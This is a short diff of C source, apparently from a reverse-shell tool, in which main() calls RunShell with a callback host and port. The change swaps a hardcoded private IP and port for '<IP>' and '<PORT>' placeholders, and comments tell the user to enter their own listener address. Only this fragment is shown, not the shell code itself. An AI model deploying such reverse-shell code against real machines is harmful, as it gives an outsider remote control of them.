@@ -68,8 +68,8 @@ int main(int argc, char **argv) {
         RunShell(argv[1], port);
     }
     else {
-        char host[] = "192.168.119.215";  // change this to your ip address
-        int port = 32115;                //chnage this to your open port
+        char host[] = "<IP>";  // change this to your ip address
+        int port = <PORT>;                //chnage this to your open port
         RunShell(host, port);
     }
     return 0;
